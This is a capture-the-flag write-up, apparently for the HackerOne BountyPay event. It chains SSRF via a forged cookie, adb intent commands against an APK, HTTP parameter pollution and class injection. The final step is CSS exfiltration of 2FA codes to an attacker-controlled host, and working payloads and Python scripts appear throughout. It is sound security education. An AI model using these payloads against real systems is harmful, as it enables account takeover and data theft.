## Original Report

## Introduction:

Hello! My name is @cr33pbp0y and I going to tell you how I resolved my first HackerOne CTF. 

## Prelude 

One day, I was reading some tweets about some new vulnerabilities and new hunters adquisitions when the Great H tweeted:

{F861267}

I thought: "WoW, a new virtual event!! It could be awesome to assist to!!!". And then, I replied the tweet:

{F861275}

My heart started to beat quickly and my mind was ready to the next (and hard...) battle, so the CTF began.

## Steps To Reproduce:

The CTF started with the wildcard: **X.bountypay.h1ctf.com**, so, when you have a new domain to investigate you should to call some of the hunter friends: Amass, Subl1ster and Aquatone!

{F861288}

With some domains discovered, I saw its faces for first time:

### bountypay.h1ctf.com
The first page of the CTF. It use? It takes you to Staff or App...
{F861294}

### api.bountypay.h1ctf.com
A nice page with a elegant message and a redirection link....suspicious....¬.¬
{F861297}

### app.bountypay.h1ctf.com
One of the important pages of all CTF (you know why later...)
{F861299}

### staff.bountypay.h1ctf.com
The second important page of the CRF
{F861301}

### software.bountypay.h1ctf.com
The little shy page...

{F861307}

So, with this material the show started!

## Enumeration:

I used **dirsearch** and **ffuf** to enumerate the findings, and some in *app.bountypay.h1ctf.com* caught my attention:

{F861313}

A **.git** resource with some file...interesting....

So the first one had the big price: if you clicked to a Github URL: https://app.bountypay.h1ctf.com/.git/config a config file showed up:

{F861319}

And with the url a file. And file inside a code with a PHP code, showing that it existed a log file living in the app page!!!

{F861320}
{F861322}

So, searching the file I found it on APP page:

{F861330}

Code was base64 encoding, so decoding it, it shows like this:

```
{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}$##"c"%U$#%"$UDB#%5B"%$2#$tUB#%5B#'W6W&R#&'&ƗfW""'77v&B#%cv祂'{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```

It showed in cleartext a username, its password and a strange challenge_answer, so I thought to logged in to app page. 

## Deeping into app.bountypay.h1ctf.com

Using the username and password disclosed in the log file, app page requested you a 2FA....maybe challenge_answer could help...

{F861347}

I tried introducing first a fake value and I realized that challenge was MD5 hash-encoded it:

{F861348}

So, using the leaked code and hashing to MD5 I was able to log in:

{F861354}
{F861353}

My internal voice: "OK! We are in! and now what?! Well...there is a button...Can I press it? Nothing...Wait! Nothing? Tamperit"

And yes, if you tamper the request, it will show the next request and the next response:

{F861367}
{F861368}

Response shows **api.bountypay.h1ctf.com**, so there was a chance to change to other page: COOL!

But, how? Digging into web app, I realized that cookie was Base64 encoded: 

```{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}```

"Ok....and now what" I thought, firstly. But, two minutes (or two hours, I don't remember very well...) later, I saw that **F8gHiqSdpK** code was reflected to the response...."What it happen if I change the cookie?"

So I was trying with some parameters and I realized there was an SSRF!!!

"But, what could I do with a SSRF?" my internal voice said again, thinking for me....

"Maybe, there could be some interesting software piece inside **software.bountypay.h1ctf.com** and for sure **api.bountypay.h1ctf.com** it's authorized to go there!!!"

So, I forged a new cookie, following the next steps:

* First, adding a hash to the finish of the account_id parameter, to comment parameters to the right of # character:

 ```{"account_id":"F8gHiqSdpK#","hash":"de235bffd23df6995ad4e0930baac1a2"}```

* Second, adding a path traversal payload to go to root part of the URL:
```{"account_id":"F8gHiqSdpK../../../../../#","hash":"de235bffd23df6995ad4e0930baac1a2"}```

* Finally, adding */redirect?url=* parameters and software URL...
```{"account_id":"F8gHiqSdpK../../../../../redirect?url=software.bountypay.h1ctf.com/#","hash":"de235bffd23df6995ad4e0930baac1a2"}```

Ok, let's try! All Base64 encoded again and let's see:

{F861395}

Nice, but it was just a username/password form...How could I recon that page?

I was thinking and thinkng, and thinking...when an idea appeared in my head:"If I create a dict with the payload and then base64 encode the code again...."

And then, I wrote a piece of script Python: something like this:

```
#!/usr/bin/env python3

from itertools import combinations 
import requests
import base64

SECLIST_FILE = './dicc.txt' ## file path

with open(SECLIST_FILE,'r') as f:
  for word in f.readlines():
    value = str.encode('{"account_id":"../../../../../redirect?url=https://software.bountypay.h1ctf.com/' + word.rstrip("\n") + '#","hash":"de235bffd23df6995ad4e0930baac1a2"}')
    token_value = base64.b64encode(value).decode('utf-8')
    response = requests.get('https://app.bountypay.h1ctf.com/statements?month=01&year=2020', cookies={'token':token_value})
    if not "Not Found" in str(response.content, word):
      print(response.content)
```
Short history long: like Burp Suite intruder but in Python. 

The code generates payloads with the values obtained from SECLIST_FILE file and request it with the cookie encoded to base64.

 It the response was not "Not Found", then the code printed the response. 

My code responsed with *uploads*:

{F861418}

And an APK file showed it up!

Going to https://software.bountypay.h1ctf.com/uploads/BountyPay.apk, I got the APk file.

## APK BOUNTY PAY: the funniest part of the show!

To this part, I just used MobSF and ADB (and my androin phone, of course).

I installed the APK file in my phone and I just saw this screen after login in:

{F862372}

Just a button that get you some hints and no more...

Taking a look to the source code using MobSF you can see that challenges was divided in three parts.

### PartOneActivity.java :

Deeping into source code, one snipet caught my attention:

{F862379}

That said my that, if you pass some parameters to APK activity, you will go to part two!!

Ok!! So, using this ADB command (and reading this awesome report https://hackerone.com/reports/328486, thanks @bagipro) 

``` adb shell am start -n bounty.pay/bounty.pay.PartOneActivity -a android.intent.action.SEND -d "one://?start=PartTwoActivity"```

I  passed to the next level.

### PartTwoActivity.java

The second screen seemed like first one, but with other hints( Current Invisible and Visible with the right params).

{F862384}

So, it seemed that, once again, I needed pass other parameters to this new one activity.

I came back to the source code again and I saw this code:

{F862386}

Like PartOne, if you passed the right parameters with the following command:

```adb shell am start -n bounty.pay/bounty.pay.PartTwoActivity -a android.intent.action.VIEW -d "two://?two=light\&switch=on" ```

The part two faced up:

{F862392}

Ok, there was a code, MD5 hash. Crackstation is always your friend, so, if you inserted this on that page, the hash reverse hash code said something like: "Token". But introducing that code with submit button didn't do anything.

As you can see two images above, in the end of the code, it shows that user must introduce "X-" prefix to access to part three.

So, introducing "X-Token" you could go to next level: Part Three

{F862411}

### PartTwoActivity.java

Once in the final round of the APK challenge, I saw the same like other ones, but with other hints (Reuse params and Intercept or check for leaks):

{F862421}

So, as I learnt on the other challenges, I came back again throug source code:

{F862427}

Reading again, if you sent the old params to APK with other values, you could see the activity interface, using the following code:

``` adb shell am start -n bounty.pay/bounty.pay.PartThreeActivity -a android.intent.action.VIEW -d "three://?three=UGFydFRocmVlQWN0aXZpdHk=\&switch=b24=\&header=X-Token"```

{F862432}

Hints said my that it was a token or something into the code, so submitting that code I would win.


I got into the phone and, searching for a file, I found this one:

{F862447}

So, using that code and submitting again I finished the APK challenge:
{F862452}
{F862454}

But a new one started!

## API and STAFF part

The final tips from APK Challenges were that I had something to do in API webpage, but what?

Well, doing some recon, I found a */api/staff/* request, that let you know that some header or token was missing:

{F862539}

So, with the APK token leaked, api got me some info about staff members:

{F862543}

Cool the requests showed the name and the staff_id of Staff Members, but the info wasn't enought to log in on staff part...

After thinking a lot, I thought on one of the picture that H1 tweeted on the CTF account .

{F862550}

Cool, another staff_id again, but I needed a password or something..."Could I request a password with staff_id? " I though...

And yes, I could,

Doing a POST over the above request and using **staff_id** as parameter, I could obtain Sandra's password ^_^

{F862555}

Thanks Sandra, I've got your password!!!

Using this credentials I could log in to staff portal.

In my opinion, it was the hardest part of the challenge!!!

When you land into the page, you see a Dashboard where the action you can do are upload Sandra's profile:

{F862569}

And see one "Welcome ticket from admin":

{F862574}

Further, user could report pages to admin if it saw something wrong....

So after thinking, asking and almost dying, I got the solution.

There was a **website.js** file that  contains the following code:

```
$(".upgradeToAdmin").click(function(){let t=$('input[name="username"]').val();$.get("/admin/upgrade?username="+t,function(){alert("User Upgraded to Admin")})}),$(".tab").click(function(){return $(".tab").removeClass("active"),$(this).addClass("active"),$("div.content").addClass("hidden"),$("div.content-"+$(this).attr("data-target")).removeClass("hidden"),!1}),$(".sendReport").click(function(){$.get("/admin/report?url="+url,function(){alert("Report sent to admin team")}),$("#myModal").modal("hide")}),document.location.hash.length>0&&("#tab1"===document.location.hash&&$(".tab1").trigger("click"),"#tab2"===document.location.hash&&$(".tab2").trigger("click"),"#tab3"===document.location.hash&&$(".tab3").trigger("click"),"#tab4"===document.location.hash&&$(".tab4").trigger("click"));
```

Furthermore, profile upload let user to upload both profile name and avatar. The avatar div had a class name #avatar(1|2|3) too and this last parameter was vulnerable to injection, so, changing the avatar in the request previous tampering and adding **upgradeToAdmin** and **tab4** class...so doing this:

{F862615}

I had this functionallity, but I need to be admin to be admin... So I needed to report something wrong...but what?

And after many smoke over my head, I thought on HTTP Parameter Pollution.

Doing the following request:

https://staff.bountypay.h1ctf.com/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab4

{F862622}

I broke the page.

{F862640}

Finally, I had to base64-encode this payload and send it to one admin, doing the following request:

{F862656}

I obtained a new tab on home dashboard with our friend, marten.mickos user and password:

{F862661}

Finally, with this info, I got ready to help our favourite H1 CEO

##  FINAL BOSS: APP AGAIN T_T

Using the same technique as the other user I landed on APP site profile of Marten. Doing some searching, I found a payment.

{F862679}

So I pushed the button "Pay" and other page came to me:

{F862683}

This page requested a weird HTTP request, trying to request some CSS file...soooooo weird.

{F862684}

And then, the page requested you a 2FA code:

{F862685}

Ok, I didn't no idea how to attack this page...

Totally confuse, I've researching about CSS attacks and I found one: CSS Exfiltration. (@d0nut explains this vulnerability better than me, so take a look at this resource https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b)

With this idea, I started to do blind CSS exfiltration requests using above request and my VPS to allocate a personal CSS and receive the server responses:

I added this sentences to the CSS:

```input[name=^c][value]{ background-image:url(https://VPS-dir/css/jur1)};```

If the server tried to contact to my VPN that means that exists a HTML input with name starting with c. 

So doing this, I obtained that there were 7 inputs: code_1 to code_7. 

Ok, so the final idea was to generate a CSS file with all conditions and codes, so if the server tried to contact with the Burp Collaborator, the input value would show up.

So coding a Python script like this

```
part1 ="input[name=code_{}][value="
part2 = """]{ 
 	background-image:url(https://collabdir/css/code_"""
part3 = """ );
	}"""

all = [i for i in string.lowercase] + [i for i in string.uppercase] + [str(i) for i in range(0,10)]
for i in range(1,8):
	for c in all:
		print(part1.format(str(i))+c+part2+str(i)+c+part3)

```

I generated all combination of characters that input could have. I pushed that file to my personal VPS. And I did the request, pointing to my VPS file and waiting some requests to my Burp Collaborator:

And the requests appeared!!

{F862734}

Sorting the puzzle pieces I got the pass and then:

{F862718}

CTF was solved!!!! 

##^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$

## Impact

## Conclusions and Acknowledgements

This CTF has been very hard, but very cool too! I learnt some new trick for my bounty, like CSS Exfiltration or HPP with some special parameters.

I want to give thanks to Adam Langley to discover me a world of posibilities to learn and get some good time.
